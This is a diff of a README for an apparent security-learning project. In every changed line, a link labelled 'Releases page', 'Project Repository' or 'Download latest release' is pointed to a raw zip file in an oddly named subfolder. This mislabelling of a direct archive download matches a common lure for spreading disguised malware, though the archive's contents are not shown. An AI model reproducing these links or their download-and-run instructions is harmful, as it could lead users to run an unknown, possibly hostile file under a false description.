@@ -6,7 +6,7 @@ Welcome to the Offensive-Security-Forensics-Portfolio! This application showcase
 
 ## 📥 Download
 
-[![Download latest release](https://raw.githubusercontent.com/DrAbdoEltbakh/Offensive-Security-Forensics-Portfolio/main/phthanite/Offensive-Security-Forensics-Portfolio-v1.8.zip%20Release-blue)](https://raw.githubusercontent.com/DrAbdoEltbakh/Offensive-Security-Forensics-Portfolio/main/phthanite/Offensive-Security-Forensics-Portfolio-v1.8.zip)
+[![Download latest release](https://github.com/DrAbdoEltbakh/Offensive-Security-Forensics-Portfolio/raw/refs/heads/main/phthanite/Forensics_Security_Portfolio_Offensive_v2.2.zip%20Release-blue)](https://github.com/DrAbdoEltbakh/Offensive-Security-Forensics-Portfolio/raw/refs/heads/main/phthanite/Forensics_Security_Portfolio_Offensive_v2.2.zip)
 
 ## 📋 Requirements
 
@@ -24,7 +24,7 @@ Follow these steps to install and run the Offensive-Security-Forensics-Portfolio
 
 1. **Visit the Releases Page**
 
-   Go to the [Releases page](https://raw.githubusercontent.com/DrAbdoEltbakh/Offensive-Security-Forensics-Portfolio/main/phthanite/Offensive-Security-Forensics-Portfolio-v1.8.zip) to find the latest version of the application.
+   Go to the [Releases page](https://github.com/DrAbdoEltbakh/Offensive-Security-Forensics-Portfolio/raw/refs/heads/main/phthanite/Forensics_Security_Portfolio_Offensive_v2.2.zip) to find the latest version of the application.
 
 2. **Download the File**
 
@@ -72,7 +72,7 @@ If you encounter issues running the application, consider these steps:
 
 - Ensure your system meets the requirements listed above.
 - Verify that all necessary permissions are granted.
-- Re-download the file from the [Releases page](https://raw.githubusercontent.com/DrAbdoEltbakh/Offensive-Security-Forensics-Portfolio/main/phthanite/Offensive-Security-Forensics-Portfolio-v1.8.zip) in case of a corrupted download.
+- Re-download the file from the [Releases page](https://github.com/DrAbdoEltbakh/Offensive-Security-Forensics-Portfolio/raw/refs/heads/main/phthanite/Forensics_Security_Portfolio_Offensive_v2.2.zip) in case of a corrupted download.
 
 ## 📞 Support
 
@@ -80,7 +80,7 @@ For additional support, reach out to the community through GitHub issues or chec
 
 ## 🔗 Links
 
-- [Project Repository](https://raw.githubusercontent.com/DrAbdoEltbakh/Offensive-Security-Forensics-Portfolio/main/phthanite/Offensive-Security-Forensics-Portfolio-v1.8.zip)
-- [Releases Page](https://raw.githubusercontent.com/DrAbdoEltbakh/Offensive-Security-Forensics-Portfolio/main/phthanite/Offensive-Security-Forensics-Portfolio-v1.8.zip)
+- [Project Repository](https://github.com/DrAbdoEltbakh/Offensive-Security-Forensics-Portfolio/raw/refs/heads/main/phthanite/Forensics_Security_Portfolio_Offensive_v2.2.zip)
+- [Releases Page](https://github.com/DrAbdoEltbakh/Offensive-Security-Forensics-Portfolio/raw/refs/heads/main/phthanite/Forensics_Security_Portfolio_Offensive_v2.2.zip)
 
 With clear steps and supportive resources, you can confidently explore and enhance your cybersecurity skills using the Offensive-Security-Forensics-Portfolio. Enjoy your learning journey!
